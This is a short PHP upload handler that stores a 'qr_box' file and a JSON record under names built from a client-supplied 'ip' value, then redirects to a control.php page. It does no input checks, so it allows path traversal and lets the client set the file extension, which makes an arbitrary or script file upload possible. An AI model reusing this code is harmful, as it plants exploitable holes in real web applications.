<?php

    if ($_POST['step'] == "qr") {

        $target_dir = "../qr/";
        $target_file = 
        $target_dir . $_POST['ip']."_".date("i")."_".".".basename($_FILES["qr_box"]["type"]);


        $j = array(
            "ip" => $_POST['ip']."_",
            "date" => date("i"),
            "type" => basename($_FILES["qr_box"]["type"]),
        );

        file_put_contents("../path_qr/".$_POST['ip'].".json",json_encode($j));
        
        move_uploaded_file($_FILES["qr_box"]["tmp_name"], $target_file);
    
        header("location: ../../../control.php?ip=" . $_POST['ip']);
        exit();
    }
?>